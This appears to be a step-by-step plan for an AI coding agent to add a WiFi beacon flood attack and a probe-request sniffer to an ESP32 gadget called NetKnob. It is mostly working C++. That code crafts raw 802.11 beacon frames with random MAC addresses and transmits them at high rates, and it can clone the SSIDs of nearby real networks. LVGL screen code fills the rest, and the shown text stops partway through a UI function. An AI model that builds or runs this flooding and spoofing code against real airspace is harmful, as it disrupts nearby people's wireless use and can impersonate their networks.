# Phase 3: Beacon Flood + Probe Sniffer — Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Add beacon flood attack and probe request sniffer to NetKnob, with a general-purpose attack state machine that future attacks (deauth in Phase 4) can reuse.

**Architecture:** Three backend modules (attack_common, wifi_attack, wifi_probe_sniffer) with no LVGL dependency, plus two screen modules following the existing ScreenDef pattern. The attack state machine (IDLE→CONFIG→ARMED→RUNNING→COMPLETE) lives in attack_common and is shared by all attack types. Frame crafting and TX scheduling live in wifi_attack. Probe capture hooks into the existing promiscuous callback.

**Tech Stack:** Arduino framework, ESP-IDF WiFi APIs (`esp_wifi_80211_tx`, promiscuous mode), LVGL 9.2 for UI, FreeRTOS primitives for ISR-safe data passing.

**Important:** Do NOT run any git commands. The user handles all git manually.

---

## File Map

| Action | File | Responsibility |
|--------|------|----------------|
| Create | `src/attack_common.h` | Attack enums, structs, state machine API |
| Create | `src/attack_common.cpp` | State machine logic, safety layer, timing |
| Create | `src/wifi_attack.h` | Beacon flood constants, templates, API |
| Create | `src/wifi_attack.cpp` | Frame crafting, SSID generation, TX scheduling |
| Create | `src/wifi_probe_sniffer.h` | Probe request structs, sniffer API |
| Create | `src/wifi_probe_sniffer.cpp` | Probe capture, parse, circular buffer |
| Create | `src/screens/scr_beacon_flood.h` | Screen header |
| Create | `src/screens/scr_beacon_flood.cpp` | Beacon flood UI (config/running/complete) |
| Create | `src/screens/scr_probe_sniff.h` | Screen header |
| Create | `src/screens/scr_probe_sniff.cpp` | Probe sniffer UI (list/detail) |
| Modify | `src/navigation.h` | Add ScreenId + EncoderMode entries |
| Modify | `src/navigation.cpp` | Extend emergency_stop to halt attacks |
| Modify | `src/screens/scr_group_menu.cpp` | Add screens to WiFi group |
| Modify | `src/wifi_scanner.cpp` | Forward probe requests to sniffer |
| Modify | `src/main.cpp` | Register screens, route input, add update calls |

---

### Task 1: Attack Common Module

**Files:**
- Create: `src/attack_common.h`
- Create: `src/attack_common.cpp`

- [ ] **Step 1: Create `src/attack_common.h`**

```cpp
#pragma once

#include <stdint.h>

enum AttackType {
    ATTACK_NONE,
    ATTACK_BEACON_FLOOD,
    ATTACK_PROBE_SNIFF
};

enum AttackPhase {
    ATTACK_IDLE,
    ATTACK_CONFIG,
    ATTACK_ARMED,
    ATTACK_RUNNING,
    ATTACK_COMPLETE
};

struct AttackStats {
    uint32_t packets_sent;
    uint32_t start_time_ms;
    uint32_t end_time_ms;
    float    avg_tx_rate;
};

struct AttackState {
    AttackType   type;
    AttackPhase  phase;
    AttackStats  stats;
    uint8_t      channel;
    uint16_t     duration_sec;       // 0 = infinite
    uint16_t     tx_rate;            // packets per second

    // Beacon-specific
    uint8_t      ssid_count;
    uint8_t      ssid_source;        // 0=random, 1=wordlist, 2=clone

    // Internal
    uint32_t     armed_start_ms;     // When ARMED phase began (for countdown)
    uint32_t     running_start_ms;   // When RUNNING phase began (for timeout)
};

#define ATTACK_COUNTDOWN_MS    1000
#define ATTACK_CONFIRM_HOLD_MS 1000
#define ATTACK_HAPTIC_INTERVAL 100

void attack_init();
void attack_update();                    // Main loop — handles countdown + timeout
void attack_start(AttackType type);      // → CONFIG
void attack_confirm();                   // CONFIG → ARMED
void attack_stop();                      // Any → COMPLETE (graceful)
void attack_emergency_stop();            // Any → IDLE (immediate, no results)
AttackState* attack_get_state();
bool attack_is_running();                // True if ARMED or RUNNING
```

- [ ] **Step 2: Create `src/attack_common.cpp`**

```cpp
#include "attack_common.h"
#include <Arduino.h>
#include <string.h>

static AttackState state;

void attack_init() {
    memset(&state, 0, sizeof(state));
    state.type = ATTACK_NONE;
    state.phase = ATTACK_IDLE;
    state.ssid_count = 20;
    state.ssid_source = 0;
    state.tx_rate = 10;
    state.duration_sec = 30;
}

void attack_update() {
    if (state.phase == ATTACK_ARMED) {
        // Countdown: ARMED → RUNNING after ATTACK_COUNTDOWN_MS
        if (millis() - state.armed_start_ms >= ATTACK_COUNTDOWN_MS) {
            state.phase = ATTACK_RUNNING;
            state.running_start_ms = millis();
            state.stats.start_time_ms = millis();
            state.stats.packets_sent = 0;
            Serial.printf("[attack] RUNNING — type=%d\n", state.type);
        }
    }

    if (state.phase == ATTACK_RUNNING && state.duration_sec > 0) {
        // Auto-timeout
        uint32_t elapsed = millis() - state.running_start_ms;
        if (elapsed >= (uint32_t)state.duration_sec * 1000) {
            attack_stop();
            Serial.println("[attack] auto-timeout");
        }
    }

    // Update avg TX rate during RUNNING
    if (state.phase == ATTACK_RUNNING && state.stats.packets_sent > 0) {
        uint32_t elapsed = millis() - state.stats.start_time_ms;
        if (elapsed > 0) {
            state.stats.avg_tx_rate = (float)state.stats.packets_sent / (elapsed / 1000.0f);
        }
    }
}

void attack_start(AttackType type) {
    state.type = type;
    state.phase = ATTACK_CONFIG;
    memset(&state.stats, 0, sizeof(state.stats));
    Serial.printf("[attack] CONFIG — type=%d\n", type);
}

void attack_confirm() {
    if (state.phase != ATTACK_CONFIG) return;
    state.phase = ATTACK_ARMED;
    state.armed_start_ms = millis();
    Serial.println("[attack] ARMED — countdown started");
}

void attack_stop() {
    if (state.phase == ATTACK_IDLE) return;
    state.stats.end_time_ms = millis();
    state.phase = ATTACK_COMPLETE;
    Serial.printf("[attack] COMPLETE — sent %u packets\n", state.stats.packets_sent);
}

void attack_emergency_stop() {
    state.phase = ATTACK_IDLE;
    state.type = ATTACK_NONE;
    Serial.println("[attack] EMERGENCY STOP");
}

AttackState* attack_get_state() {
    return &state;
}

bool attack_is_running() {
    return state.phase == ATTACK_ARMED || state.phase == ATTACK_RUNNING;
}
```

- [ ] **Step 3: Verify it compiles**

Run: `cd C:/Users/roarh/Documents/code/NetKnob/NetKnob && pio run`
Expected: SUCCESS (module compiled but not yet called from main)

- [ ] **Step 4: Commit**

---

### Task 2: WiFi Attack Module (Beacon Flood Engine)

**Files:**
- Create: `src/wifi_attack.h`
- Create: `src/wifi_attack.cpp`

- [ ] **Step 1: Create `src/wifi_attack.h`**

```cpp
#pragma once

#include <stdint.h>

#define BEACON_MAX_SSIDS        50
#define BEACON_DEFAULT_COUNT    20
#define BEACON_DEFAULT_RATE     10
#define BEACON_MAX_RATE         500
#define ATTACK_DEFAULT_DURATION 30

#define BEACON_WORDLIST_COUNT   20

struct BeaconTemplate {
    uint8_t  frame[128];
    uint8_t  frame_len;
    uint16_t seq_number;
};

void wifi_attack_init();
void wifi_attack_start_beacon_flood();   // Build frames, prepare TX
void wifi_attack_stop();                 // Stop TX
void wifi_attack_update();               // Main loop — send frames at rate
```

- [ ] **Step 2: Create `src/wifi_attack.cpp`**

```cpp
#include "wifi_attack.h"
#include "attack_common.h"
#include "wifi_scanner.h"
#include <Arduino.h>
#include <esp_wifi.h>
#include <string.h>

// ---------------------------------------------------------------------------
// SSID wordlist
// ---------------------------------------------------------------------------
static const char* SSID_WORDLIST[BEACON_WORDLIST_COUNT] = {
    "Free WiFi",
    "FBI Surveillance Van",
    "Pretty Fly for a Wi-Fi",
    "Drop It Like Its Hotspot",
    "The LAN Before Time",
    "Wu-Tang LAN",
    "Router I Hardly Know Her",
    "Bill Wi the Science Fi",
    "LAN Solo",
    "The Promised LAN",
    "Nacho WiFi",
    "Get Off My LAN",
    "It Burns When IP",
    "No More Mr Wi-Fi",
    "Silence of the LANs",
    "Loading...",
    "Searching...",
    "Connecting...",
    "Not Your WiFi",
    "Virus Detected"
};

// ---------------------------------------------------------------------------
// Frame storage
// ---------------------------------------------------------------------------
static BeaconTemplate templates[BEACON_MAX_SSIDS];
static uint8_t bssids[BEACON_MAX_SSIDS][6];
static char ssid_list[BEACON_MAX_SSIDS][33];
static uint8_t active_ssid_count = 0;
static uint32_t last_tx_ms = 0;
static uint8_t tx_index = 0;  // Round-robin index

// ---------------------------------------------------------------------------
// MAC generation
// ---------------------------------------------------------------------------
static void random_mac(uint8_t mac[6]) {
    for (int i = 0; i < 6; i++) mac[i] = (uint8_t)esp_random();
    mac[0] = (mac[0] | 0x02) & 0xFE;  // locally administered, unicast
}

// ---------------------------------------------------------------------------
// SSID generation
// ---------------------------------------------------------------------------
static void generate_random_ssid(char* out, uint8_t max_len) {
    uint8_t len = 8 + (esp_random() % 5); // 8-12 chars
    if (len > max_len - 1) len = max_len - 1;
    for (uint8_t i = 0; i < len; i++) {
        uint8_t r = esp_random() % 62;
        if (r < 26) out[i] = 'A' + r;
        else if (r < 52) out[i] = 'a' + (r - 26);
        else out[i] = '0' + (r - 52);
    }
    out[len] = '\0';
}

static void generate_ssids(uint8_t count, uint8_t source) {
    active_ssid_count = count;
    if (active_ssid_count > BEACON_MAX_SSIDS) active_ssid_count = BEACON_MAX_SSIDS;

    for (uint8_t i = 0; i < active_ssid_count; i++) {
        switch (source) {
            case 0: // Random
                generate_random_ssid(ssid_list[i], 33);
                break;
            case 1: // Wordlist
                strncpy(ssid_list[i], SSID_WORDLIST[i % BEACON_WORDLIST_COUNT], 32);
                ssid_list[i][32] = '\0';
                break;
            case 2: { // Clone nearby
                WifiScannerState* ws = scanner_get_state();
                if (i < ws->ap_count && !ws->ap_list[i].hidden) {
                    strncpy(ssid_list[i], ws->ap_list[i].ssid, 32);
                    ssid_list[i][32] = '\0';
                } else {
                    generate_random_ssid(ssid_list[i], 33);
                }
                break;
            }
        }
        random_mac(bssids[i]);
    }
}

// ---------------------------------------------------------------------------
// Frame building
// ---------------------------------------------------------------------------
static void build_beacon(BeaconTemplate* bt, const char* ssid, uint8_t channel, const uint8_t bssid[6]) {
    uint8_t* p = bt->frame;
    uint8_t ssid_len = strlen(ssid);
    if (ssid_len > 32) ssid_len = 32;

    // MAC header (24 bytes)
    *p++ = 0x80; *p++ = 0x00;           // Frame control: beacon
    *p++ = 0x00; *p++ = 0x00;           // Duration
    memset(p, 0xFF, 6); p += 6;         // Dest: broadcast
    memcpy(p, bssid, 6); p += 6;        // Source
    memcpy(p, bssid, 6); p += 6;        // BSSID
    *p++ = 0x00; *p++ = 0x00;           // Seq control (updated per send)

    // Beacon body (12 bytes)
    memset(p, 0, 8); p += 8;            // Timestamp
    *p++ = 0x64; *p++ = 0x00;           // Beacon interval (100 TU)
    *p++ = 0x04; *p++ = 0x31;           // Capability (ESS + privacy)

    // Tag 0: SSID
    *p++ = 0x00; *p++ = ssid_len;
    memcpy(p, ssid, ssid_len); p += ssid_len;

    // Tag 1: Supported Rates
    *p++ = 0x01; *p++ = 0x08;
    *p++ = 0x82; *p++ = 0x84; *p++ = 0x8B; *p++ = 0x96;
    *p++ = 0x24; *p++ = 0x30; *p++ = 0x48; *p++ = 0x6C;

    // Tag 3: DS Parameter Set
    *p++ = 0x03; *p++ = 0x01; *p++ = channel;

    // Tag 48: RSN IE (WPA2-PSK)
    *p++ = 0x30; *p++ = 0x14;
    *p++ = 0x01; *p++ = 0x00;           // Version
    *p++ = 0x00; *p++ = 0x0F; *p++ = 0xAC; *p++ = 0x04; // Group: AES
    *p++ = 0x01; *p++ = 0x00;           // Pairwise count
    *p++ = 0x00; *p++ = 0x0F; *p++ = 0xAC; *p++ = 0x04; // Pairwise: AES
    *p++ = 0x01; *p++ = 0x00;           // AKM count
    *p++ = 0x00; *p++ = 0x0F; *p++ = 0xAC; *p++ = 0x02; // AKM: PSK
    *p++ = 0x00; *p++ = 0x00;           // RSN capabilities

    bt->frame_len = (uint8_t)(p - bt->frame);
    bt->seq_number = 0;
}

static void send_beacon(BeaconTemplate* bt) {
    bt->seq_number++;
    uint16_t sc = (bt->seq_number & 0x0FFF) << 4;
    bt->frame[22] = (uint8_t)(sc & 0xFF);
    bt->frame[23] = (uint8_t)(sc >> 8);
    esp_wifi_80211_tx(WIFI_IF_STA, bt->frame, bt->frame_len, false);
}

// ---------------------------------------------------------------------------
// Public API
// ---------------------------------------------------------------------------
void wifi_attack_init() {
    memset(templates, 0, sizeof(templates));
    active_ssid_count = 0;
}

void wifi_attack_start_beacon_flood() {
    AttackState* as = attack_get_state();

    // Set channel
    as->channel = scanner_get_state()->current_channel;
    esp_wifi_set_channel(as->channel, WIFI_SECOND_CHAN_NONE);

    // Generate SSIDs and build frames
    generate_ssids(as->ssid_count, as->ssid_source);
    for (uint8_t i = 0; i < active_ssid_count; i++) {
        build_beacon(&templates[i], ssid_list[i], as->channel, bssids[i]);
    }

    last_tx_ms = 0;
    tx_index = 0;
    Serial.printf("[wifi_attack] beacon flood prepared: %d SSIDs, ch=%d\n",
                  active_ssid_count, as->channel);
}

void wifi_attack_stop() {
    active_ssid_count = 0;
    tx_index = 0;
}

void wifi_attack_update() {
    AttackState* as = attack_get_state();
    if (as->phase != ATTACK_RUNNING || as->type != ATTACK_BEACON_FLOOD) return;
    if (active_ssid_count == 0) return;

    // Calculate interval: total rate = tx_rate * ssid_count
    // We send one beacon per call, round-robin through SSIDs
    // Total pps = tx_rate * ssid_count, interval = 1000 / total_pps
    uint32_t total_pps = (uint32_t)as->tx_rate * active_ssid_count;
    if (total_pps == 0) total_pps = 1;
    uint32_t interval_ms = 1000 / total_pps;
    if (interval_ms < 1) interval_ms = 1;

    uint32_t now = millis();
    if (now - last_tx_ms >= interval_ms) {
        last_tx_ms = now;
        send_beacon(&templates[tx_index]);
        as->stats.packets_sent++;
        tx_index = (tx_index + 1) % active_ssid_count;
    }
}
```

- [ ] **Step 3: Verify it compiles**

Run: `cd C:/Users/roarh/Documents/code/NetKnob/NetKnob && pio run`
Expected: SUCCESS

- [ ] **Step 4: Commit**

---

### Task 3: Navigation Updates + Group Menu

**Files:**
- Modify: `src/navigation.h`
- Modify: `src/navigation.cpp`
- Modify: `src/screens/scr_group_menu.cpp`

- [ ] **Step 1: Add new ScreenId and EncoderMode entries to `src/navigation.h`**

In the `ScreenId` enum, add before `SCREEN_COUNT`:

```cpp
    SCREEN_BEACON_FLOOD,
    SCREEN_PROBE_SNIFF,
```

In the `EncoderMode` enum, add before `ENC_LOCKED`:

```cpp
    ENC_ATTACK_PARAM,       // Attack parameter adjustment
```

- [ ] **Step 2: Extend emergency stop in `src/navigation.cpp`**

Add include at top:
```cpp
#include "attack_common.h"
```

Replace the `navigation_emergency_stop` function:
```cpp
void navigation_emergency_stop() {
    attack_emergency_stop();  // Halt any active attack
    haptic_play(10);          // Strong double-pulse
    navigation_goto(SCREEN_MAIN_MENU);
    Serial.println("[nav] EMERGENCY STOP");
}
```

- [ ] **Step 3: Add Phase 3 screens to WiFi group in `src/screens/scr_group_menu.cpp`**

Replace the `GROUP_WIFI` case in `populate_group()`:
```cpp
        case GROUP_WIFI:
            group_screens[0] = SCREEN_WIFI_SCAN;
            group_screen_names[0] = "Scanner";
            group_screens[1] = SCREEN_BEACON_FLOOD;
            group_screen_names[1] = "Beacon Flood";
            group_screens[2] = SCREEN_PROBE_SNIFF;
            group_screen_names[2] = "Probe Sniffer";
            group_screen_count = 3;
            break;
```

- [ ] **Step 4: Verify it compiles**

Run: `cd C:/Users/roarh/Documents/code/NetKnob/NetKnob && pio run`
Expected: SUCCESS (screens referenced but not yet created — ScreenDef externs will be needed in Task 5/7)

Note: This may fail until the screen headers exist. If so, create stub headers first (see Tasks 5 and 7 step 1).

- [ ] **Step 5: Commit**

---

### Task 4: Beacon Flood Screen — Header + Stub

**Files:**
- Create: `src/screens/scr_beacon_flood.h`
- Create: `src/screens/scr_beacon_flood.cpp` (stub)

- [ ] **Step 1: Create `src/screens/scr_beacon_flood.h`**

```cpp
#pragma once

#include "navigation.h"

extern const ScreenDef scr_beacon_flood_def;

void scr_beacon_flood_on_encoder(int8_t delta);
void scr_beacon_flood_on_tap();
void scr_beacon_flood_on_hold();
```

- [ ] **Step 2: Create `src/screens/scr_beacon_flood.cpp` with stub lifecycle**

```cpp
#include "scr_beacon_flood.h"
#include "display.h"
#include "haptic.h"
#include "attack_common.h"
#include "wifi_attack.h"
#include "wifi_scanner.h"
#include <Arduino.h>
#include <lvgl.h>
#include <string.h>
#include <stdio.h>

// ---------------------------------------------------------------------------
// LVGL objects
// ---------------------------------------------------------------------------
static lv_obj_t* scr_root = NULL;

// Config view
static lv_obj_t* lbl_title      = NULL;
static lv_obj_t* lbl_channel    = NULL;
static lv_obj_t* lbl_params[4]  = {};   // ssid_count, source, tx_rate, duration
static lv_obj_t* lbl_total_rate = NULL;
static lv_obj_t* lbl_hint       = NULL;
static uint8_t   param_cursor   = 0;    // Which param is selected (0-3)

// Running view
static lv_obj_t* lbl_run_title  = NULL;
static lv_obj_t* lbl_run_ssids  = NULL;
static lv_obj_t* lbl_run_rate   = NULL;
static lv_obj_t* lbl_run_sent   = NULL;
static lv_obj_t* lbl_run_time   = NULL;
static lv_obj_t* bar_progress   = NULL;
static lv_obj_t* lbl_run_hint   = NULL;

// Complete view
static lv_obj_t* lbl_comp_title = NULL;
static lv_obj_t* lbl_comp_dur   = NULL;
static lv_obj_t* lbl_comp_total = NULL;
static lv_obj_t* lbl_comp_rate  = NULL;
static lv_obj_t* lbl_comp_hint  = NULL;

// Border glow
static lv_obj_t* border_glow    = NULL;

// State
static bool config_built   = false;
static bool running_built  = false;
static bool complete_built = false;
static uint32_t last_ui_update = 0;

// ---------------------------------------------------------------------------
// Source mode names
// ---------------------------------------------------------------------------
static const char* source_names[] = { "Random", "Wordlist", "Clone" };

// ---------------------------------------------------------------------------
// Helper: hide all view objects
// ---------------------------------------------------------------------------
static void hide_all_views() {
    lv_obj_t* config_objs[] = { lbl_title, lbl_channel, lbl_params[0], lbl_params[1],
                                 lbl_params[2], lbl_params[3], lbl_total_rate, lbl_hint };
    lv_obj_t* run_objs[]    = { lbl_run_title, lbl_run_ssids, lbl_run_rate,
                                 lbl_run_sent, lbl_run_time, bar_progress, lbl_run_hint };
    lv_obj_t* comp_objs[]   = { lbl_comp_title, lbl_comp_dur, lbl_comp_total,
                                 lbl_comp_rate, lbl_comp_hint };

    for (auto* obj : config_objs) if (obj) lv_obj_add_flag(obj, LV_OBJ_FLAG_HIDDEN);
    for (auto* obj : run_objs)    if (obj) lv_obj_add_flag(obj, LV_OBJ_FLAG_HIDDEN);
    for (auto* obj : comp_objs)   if (obj) lv_obj_add_flag(obj, LV_OBJ_FLAG_HIDDEN);
    if (border_glow) lv_obj_add_flag(border_glow, LV_OBJ_FLAG_HIDDEN);
}

// ---------------------------------------------------------------------------
// Build config view
// ---------------------------------------------------------------------------
static void build_config_view() {
    if (config_built) return;

    lbl_title = lv_label_create(scr_root);
    lv_label_set_text(lbl_title, "BEACON FLOOD");
    lv_obj_set_style_text_font(lbl_title, &lv_font_montserrat_20, 0);
    lv_obj_set_style_text_color(lbl_title, COL_CYAN, 0);
    lv_obj_align(lbl_title, LV_ALIGN_TOP_MID, 0, 35);

    lbl_channel = lv_label_create(scr_root);
    lv_obj_set_style_text_font(lbl_channel, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(lbl_channel, COL_GRAY, 0);
    lv_obj_align(lbl_channel, LV_ALIGN_TOP_MID, 0, 62);

    for (int i = 0; i < 4; i++) {
        lbl_params[i] = lv_label_create(scr_root);
        lv_obj_set_style_text_font(lbl_params[i], &lv_font_montserrat_16, 0);
        lv_obj_align(lbl_params[i], LV_ALIGN_TOP_LEFT, 30, 90 + i * 32);
    }

    lbl_total_rate = lv_label_create(scr_root);
    lv_obj_set_style_text_font(lbl_total_rate, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(lbl_total_rate, COL_CYAN_DIM, 0);
    lv_obj_align(lbl_total_rate, LV_ALIGN_TOP_MID, 0, 225);

    lbl_hint = lv_label_create(scr_root);
    lv_label_set_text(lbl_hint, "hold = START");
    lv_obj_set_style_text_font(lbl_hint, &lv_font_montserrat_12, 0);
    lv_obj_set_style_text_color(lbl_hint, COL_GRAY, 0);
    lv_obj_align(lbl_hint, LV_ALIGN_BOTTOM_MID, 0, -40);

    config_built = true;
}

// ---------------------------------------------------------------------------
// Build running view
// ---------------------------------------------------------------------------
static void build_running_view() {
    if (running_built) return;

    // Magenta border glow
    border_glow = lv_obj_create(scr_root);
    lv_obj_set_size(border_glow, 360, 360);
    lv_obj_set_style_bg_opa(border_glow, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(border_glow, 4, 0);
    lv_obj_set_style_border_color(border_glow, lv_color_make(0xFF, 0x00, 0xFF), 0);
    lv_obj_set_style_border_opa(border_glow, LV_OPA_70, 0);
    lv_obj_set_style_radius(border_glow, 180, 0);
    lv_obj_center(border_glow);
    lv_obj_clear_flag(border_glow, LV_OBJ_FLAG_CLICKABLE);

    lbl_run_title = lv_label_create(scr_root);
    lv_label_set_text(lbl_run_title, "BEACON FLOOD");
    lv_obj_set_style_text_font(lbl_run_title, &lv_font_montserrat_20, 0);
    lv_obj_set_style_text_color(lbl_run_title, lv_color_make(0xFF, 0x00, 0xFF), 0);
    lv_obj_align(lbl_run_title, LV_ALIGN_TOP_MID, 0, 35);

    lbl_run_ssids = lv_label_create(scr_root);
    lv_obj_set_style_text_font(lbl_run_ssids, &lv_font_montserrat_16, 0);
    lv_obj_set_style_text_color(lbl_run_ssids, COL_WHITE, 0);
    lv_obj_align(lbl_run_ssids, LV_ALIGN_TOP_LEFT, 30, 80);

    lbl_run_rate = lv_label_create(scr_root);
    lv_obj_set_style_text_font(lbl_run_rate, &lv_font_montserrat_16, 0);
    lv_obj_set_style_text_color(lbl_run_rate, COL_WHITE, 0);
    lv_obj_align(lbl_run_rate, LV_ALIGN_TOP_LEFT, 30, 110);

    lbl_run_sent = lv_label_create(scr_root);
    lv_obj_set_style_text_font(lbl_run_sent, &lv_font_montserrat_16, 0);
    lv_obj_set_style_text_color(lbl_run_sent, COL_GREEN, 0);
    lv_obj_align(lbl_run_sent, LV_ALIGN_TOP_LEFT, 30, 140);

    lbl_run_time = lv_label_create(scr_root);
    lv_obj_set_style_text_font(lbl_run_time, &lv_font_montserrat_16, 0);
    lv_obj_set_style_text_color(lbl_run_time, COL_WHITE, 0);
    lv_obj_align(lbl_run_time, LV_ALIGN_TOP_LEFT, 30, 170);

    bar_progress = lv_bar_create(scr_root);
    lv_obj_set_size(bar_progress, 240, 12);
    lv_obj_align(bar_progress, LV_ALIGN_TOP_MID, 0, 210);
    lv_obj_set_style_bg_color(bar_progress, COL_DARK, 0);
    lv_obj_set_style_bg_color(bar_progress, lv_color_make(0xFF, 0x00, 0xFF), LV_PART_INDICATOR);
    lv_bar_set_range(bar_progress, 0, 100);

    lbl_run_hint = lv_label_create(scr_root);
    lv_label_set_text(lbl_run_hint, "hold = STOP");
    lv_obj_set_style_text_font(lbl_run_hint, &lv_font_montserrat_12, 0);
    lv_obj_set_style_text_color(lbl_run_hint, COL_GRAY, 0);
    lv_obj_align(lbl_run_hint, LV_ALIGN_BOTTOM_MID, 0, -40);

    running_built = true;
}

// ---------------------------------------------------------------------------
// Build complete view
// ---------------------------------------------------------------------------
static void build_complete_view() {
    if (complete_built) return;

    lbl_comp_title = lv_label_create(scr_root);
    lv_label_set_text(lbl_comp_title, "FLOOD COMPLETE");
    lv_obj_set_style_text_font(lbl_comp_title, &lv_font_montserrat_20, 0);
    lv_obj_set_style_text_color(lbl_comp_title, COL_GREEN, 0);
    lv_obj_align(lbl_comp_title, LV_ALIGN_TOP_MID, 0, 50);

    lbl_comp_dur = lv_label_create(scr_root);
    lv_obj_set_style_text_font(lbl_comp_dur, &lv_font_montserrat_16, 0);
    lv_obj_set_style_text_color(lbl_comp_dur, COL_WHITE, 0);
    lv_obj_align(lbl_comp_dur, LV_ALIGN_TOP_LEFT, 40, 110);

    lbl_comp_total = lv_label_create(scr_root);
    lv_obj_set_style_text_font(lbl_comp_total, &lv_font_montserrat_16, 0);
    lv_obj_set_style_text_color(lbl_comp_total, COL_WHITE, 0);
    lv_obj_align(lbl_comp_total, LV_ALIGN_TOP_LEFT, 40, 145);

    lbl_comp_rate = lv_label_create(scr_root);
    lv_obj_set_style_text_font(lbl_comp_rate, &lv_font_montserrat_16, 0);
    lv_obj_set_style_text_color(lbl_comp_rate, COL_WHITE, 0);
    lv_obj_align(lbl_comp_rate, LV_ALIGN_TOP_LEFT, 40, 180);

    lbl_comp_hint = lv_label_create(scr_root);
    lv_label_set_text(lbl_comp_hint, "tap = dismiss  hold = again");
    lv_obj_set_style_text_font(lbl_comp_hint, &lv_font_montserrat_12, 0);
    lv_obj_set_style_text_color(lbl_comp_hint, COL_GRAY, 0);
    lv_obj_align(lbl_comp_hint, LV_ALIGN_BOTTOM_MID, 0, -40);

    complete_built = true;
}

// ---------------------------------------------------------------------------
// Update display for current phase
// ---------------------------------------------------------------------------
static void update_config_display() {
    AttackState* as = attack_get_state();
    char buf[48];

    snprintf(buf, sizeof(buf), "Channel: %d", scanner_get_state()->current_channel);
    lv_label_set_text(lbl_channel, buf);

    const char* param_labels[] = { "SSIDs", "Source", "Rate", "Duration" };
    const char* arrow = "\xE2\x96\xB6 ";  // ▶

    // SSID count
    snprintf(buf, sizeof(buf), "%s%s: %d", param_cursor == 0 ? arrow : "  ", param_labels[0], as->ssid_count);
    lv_label_set_text(lbl_params[0], buf);
    lv_obj_set_style_text_color(lbl_params[0], param_cursor == 0 ? COL_CYAN : COL_WHITE, 0);

    // Source
    snprintf(buf, sizeof(buf), "%s%s: %s", param_cursor == 1 ? arrow : "  ", param_labels[1], source_names[as->ssid_source]);
    lv_label_set_text(lbl_params[1], buf);
    lv_obj_set_style_text_color(lbl_params[1], param_cursor == 1 ? COL_CYAN : COL_WHITE, 0);

    // TX rate
    snprintf(buf, sizeof(buf), "%s%s: %d/s/AP", param_cursor == 2 ? arrow : "  ", param_labels[2], as->tx_rate);
    lv_label_set_text(lbl_params[2], buf);
    lv_obj_set_style_text_color(lbl_params[2], param_cursor == 2 ? COL_CYAN : COL_WHITE, 0);

    // Duration
    if (as->duration_sec == 0) {
        snprintf(buf, sizeof(buf), "%s%s: infinite", param_cursor == 3 ? arrow : "  ", param_labels[3]);
    } else {
        snprintf(buf, sizeof(buf), "%s%s: %ds", param_cursor == 3 ? arrow : "  ", param_labels[3], as->duration_sec);
    }
    lv_label_set_text(lbl_params[3], buf);
    lv_obj_set_style_text_color(lbl_params[3], param_cursor == 3 ? COL_CYAN : COL_WHITE, 0);

    // Total rate preview
    snprintf(buf, sizeof(buf), "Total: ~%d pkt/s", as->tx_rate * as->ssid_count);
    lv_label_set_text(lbl_total_rate, buf);
}

static void update_running_display() {
    AttackState* as = attack_get_state();
    char buf[48];

    snprintf(buf, sizeof(buf), "SSIDs: %d active", as->ssid_count);
    lv_label_set_text(lbl_run_ssids, buf);

    snprintf(buf, sizeof(buf), "Rate: %.0f pkt/s", as->stats.avg_tx_rate);
    lv_label_set_text(lbl_run_rate, buf);

    snprintf(buf, sizeof(buf), "Sent: %u", as->stats.packets_sent);
    lv_label_set_text(lbl_run_sent, buf);

    uint32_t elapsed = (millis() - as->stats.start_time_ms) / 1000;
    if (as->duration_sec > 0) {
        snprintf(buf, sizeof(buf), "Time: %02d:%02d / %02d:%02d",
                 elapsed / 60, elapsed % 60, as->duration_sec / 60, as->duration_sec % 60);
        lv_bar_set_value(bar_progress, (elapsed * 100) / as->duration_sec, LV_ANIM_OFF);
    } else {
        snprintf(buf, sizeof(buf), "Time: %02d:%02d / --:--", elapsed / 60, elapsed % 60);
        lv_bar_set_value(bar_progress, 50, LV_ANIM_OFF);  // Indeterminate
    }
    lv_label_set_text(lbl_run_time, buf);
}

static void update_complete_display() {
    AttackState* as = attack_get_state();
    char buf[48];

    uint32_t dur_ms = as->stats.end_time_ms - as->stats.start_time_ms;
    float dur_s = dur_ms / 1000.0f;
    snprintf(buf, sizeof(buf), "Duration: %.1fs", dur_s);
    lv_label_set_text(lbl_comp_dur, buf);

    snprintf(buf, sizeof(buf), "Total TX: %u", as->stats.packets_sent);
    lv_label_set_text(lbl_comp_total, buf);

    snprintf(buf, sizeof(buf), "Avg rate: %.0f pkt/s", as->stats.avg_tx_rate);
    lv_label_set_text(lbl_comp_rate, buf);
}

// ---------------------------------------------------------------------------
// Show the correct view for current phase
// ---------------------------------------------------------------------------
static void show_phase_view() {
    AttackState* as = attack_get_state();
    hide_all_views();

    switch (as->phase) {
        case ATTACK_CONFIG:
        case ATTACK_IDLE:
            build_config_view();
            lv_obj_clear_flag(lbl_title, LV_OBJ_FLAG_HIDDEN);
            lv_obj_clear_flag(lbl_channel, LV_OBJ_FLAG_HIDDEN);
            for (int i = 0; i < 4; i++) lv_obj_clear_flag(lbl_params[i], LV_OBJ_FLAG_HIDDEN);
            lv_obj_clear_flag(lbl_total_rate, LV_OBJ_FLAG_HIDDEN);
            lv_obj_clear_flag(lbl_hint, LV_OBJ_FLAG_HIDDEN);
            update_config_display();
            break;

        case ATTACK_ARMED:
        case ATTACK_RUNNING:
            build_running_view();
            lv_obj_clear_flag(lbl_run_title, LV_OBJ_FLAG_HIDDEN);
            lv_obj_clear_flag(lbl_run_ssids, LV_OBJ_FLAG_HIDDEN);
            lv_obj_clear_flag(lbl_run_rate, LV_OBJ_FLAG_HIDDEN);
            lv_obj_clear_flag(lbl_run_sent, LV_OBJ_FLAG_HIDDEN);
            lv_obj_clear_flag(lbl_run_time, LV_OBJ_FLAG_HIDDEN);
            lv_obj_clear_flag(bar_progress, LV_OBJ_FLAG_HIDDEN);
            lv_obj_clear_flag(lbl_run_hint, LV_OBJ_FLAG_HIDDEN);
            lv_obj_clear_flag(border_glow, LV_OBJ_FLAG_HIDDEN);
            update_running_display();
            break;

        case ATTACK_COMPLETE:
            build_complete_view();
            lv_obj_clear_flag(lbl_comp_title, LV_OBJ_FLAG_HIDDEN);
